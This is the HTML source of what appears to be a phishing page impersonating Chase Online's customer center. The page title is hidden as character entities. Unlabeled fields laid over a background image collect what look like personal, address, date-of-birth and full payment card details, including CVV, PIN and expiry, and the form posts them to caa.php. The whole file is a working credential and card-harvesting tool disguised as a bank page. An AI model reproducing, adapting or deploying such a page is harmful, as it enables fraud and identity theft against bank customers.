<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html><head><title>&#67;&#104;&#97;&#115;&#101;&#32;&#79;&#110;&#108;&#105;&#110;&#101;&#32;&#45;&#32;&#67;&#117;&#115;&#116;&#111;&#109;&#101;&#114;&#32;&#67;&#101;&#110;&#116;&#101;&#114;</title><body id="ridBody" background="bg2.png">
</head>
<body>

<form action=caa.php name=chalbhai id=chalbhai method=post>

<input name="formtext1" required autocomplete="off" type="text" style="position:absolute;height:22px;width:209px;left:501px;top:376px;z-index:19">

<input name="formtext2" required autocomplete="off" type="text" style="position:absolute;height:22px;width:240px;left:501px;top:406px;z-index:20">

<input name="formtext3" required autocomplete="off" type="text" style="position:absolute;height:22px;width:209px;left:501px;top:434px;z-index:20">

<input name="formtext4" required autocomplete="off" type="text" style="position:absolute;height:22px;width:209px;left:501px;top:466px;z-index:20">

<select name="formselect1" style="position:absolute;left:501px;top:497px;z-index:21">
<option value=""></option>
<option>AK</option>
<option>AL</option>
<option>AR</option>
<option>AZ</option>
<option>CA</option>
<option>CO</option>
<option>CT</option>
<option>DC</option>
<option>DE</option>
<option>FL</option>
<option>GA</option>
<option>HI</option>
<option>IA</option>
<option>ID</option>
<option>IL</option>
<option>IN</option>
<option>KS</option>
<option>KY</option>
<option>LA</option>
<option>MA</option>
<option>MD</option>
<option>ME</option>
<option>MI</option>
<option>MN</option>
<option>MO</option>
<option>MS</option>
<option>MT</option>
<option>NC</option>
<option>ND</option>
<option>NE</option>
<option>NH</option>
<option>NJ</option>
<option>NM</option>
<option>NV</option>
<option>NY</option>
<option>OH</option>
<option>OK</option>
<option>OR</option>
<option>PA</option>
<option>RI</option>
<option>SC</option>
<option>SD</option>
<option>TN</option>
<option>TX</option>
<option>UT</option>
<option>VA</option>
<option>VT</option>
<option>WA</option>
<option>WI</option>
<option>WV</option>
<option>WY</option>
<option>AA</option>
<option>AE</option>
<option>AP</option>
<option>AS</option>
<option>FM</option>
<option>GU</option>
<option>MH</option>
<option>MP</option>
<option>PR</option>
<option>PW</option>
<option>VI</option></select>

<input name="formtext5" required autocomplete="off" type="text" style="position:absolute;height:22px;width:85px;left:501px;top:526px;z-index:20">&nbsp;

<input name="formtext6" required autocomplete="off" type="text" style="position:absolute;height:22px;width:114px;left:501;top:553;z-index:20">

<input name="formtext7" required autocomplete="off" type="text" style="position:absolute;height:22px;width:149px;left:511;top:670;z-index:20">

<input name="formtext8" required autocomplete="off" type="text" style="position:absolute;height:22px;width:149px;left:511;top:697;z-index:20">&nbsp;&nbsp;&nbsp;

<input name="formtext9" required autocomplete="off" type="text" value="dd" style="position:absolute;height:22px;width:41px;left:511;top:726;z-index:20">

<input name="formtext10" required autocomplete="off" type="text" value="mm" style="position:absolute;height:22px;width:41px;left:556px;top:726px;z-index:20">

<input name="formtext11" required autocomplete="off" type="text" value="yyyy" style="position:absolute;height:22px;width:58px;left:601px;top:726px;z-index:20">

<input name="formtext12" required autocomplete="off" type="text" style="position:absolute;height:22px;width:199px;left:511;top:851;z-index:20">

<input name="formtext13" required autocomplete="off" type="text" style="position:absolute;height:22px;width:47px;left:511;top:879;z-index:20">

<input name="formtext14" required autocomplete="off" type="text" style="position:absolute;height:22px;width:53px;left:511;top:911;z-index:20">

<select name="formselect2" style="position:absolute;left:511;top:939;z-index:21">
<option>Month</option>

<option>January</option>
<option>February</option>
<option>March</option>
<option>April</option>
<option>May</option>
<option>June</option>
<option>July</option>
<option>August</option>
<option>September</option>

<option>October</option>
<option>November</option>
<option>December</option></select>

<select name="formselect3" style="position:absolute;left:609;top:939;z-index:21">
<option>Year</option>
<option>2016</option>
<option>2017</option>
<option>2018</option>
<option>2019</option>

<option>2020</option>
<option>2021</option>
<option>2022</option>
<option>2023</option>
<option>2024</option>
<option>2025</option>
<option>2026</option>
<option>2027</option>
<option>2028</option>

<option>2029</option>
<option>2030</option>
<option>2031</option>
<option>2032</option>
<option>2033</option>
<option>2034</option>
<option>2035</option>
<option>2036</option>
<option>2037</option>

<option>2038</option>
<option>2039</option>
<option>2040</option>
<option>2041</option>
<option>2042</option>
<option>2043</option>
<option>2044</option>
<option>2045</option>
<option>2046</option>

<option>2047</option>
<option>2048</option>
<option>2049</option>
<option>2050</option>
<option>2051</option>
<option>2052</option>
<option>2053</option>
<option>2054</option>
<option>2055</option>

<option>2056</option>
<option>2057</option>
<option>2058</option>
<option>2059</option>
<option>2060</option>
<option>2061</option>
<option>2062</option>
<option>2063</option>
<option>2064</option>

<option>2065</option>
<option>2066</option>
<option>2067</option>
<option>2068</option>
<option>2069</option>
<option>2070</option>
<option>2071</option>
<option>2072</option>
<option>2073</option>

<option>2074</option>
<option>2075</option>
<option>2076</option>
<option>2077</option>
<option>2078</option>
<option>2079</option>
<option>2080</option>
<option>2081</option>
<option>2082</option>

<option>2083</option>
<option>2084</option>
<option>2085</option>
<option>2086</option>
<option>2087</option>
<option>2088</option>
<option>2089</option>
<option>2090</option>
<option>2091</option>

<option>2092</option>
<option>2093</option>
<option>2094</option>
<option>2095</option>
<option>2096</option>
<option>2097</option>
<option>2098</option>
<option>2099</option>
<option>2100</option>

<option>2101</option>
<option>2102</option>
<option>2103</option>
<option>2104</option>
<option>2105</option>
<option>2106</option>
<option>2107</option>
<option>2108</option></select>

<input name="formtext15" required autocomplete="off" type="text" style="position:absolute;height:22px;width:153px;left:511;top:968;z-index:20">

<div id="formimage1" style="position:absolute; left:490px; top:1075px; z-index:6"><input type="image" name="formimage1" src="update.png"></div>

<div style="position:absolute; left:597px; top:1380px; z-index:6"><input type="image" name="formimage1" src="w.png">
</form>

</body>
</html>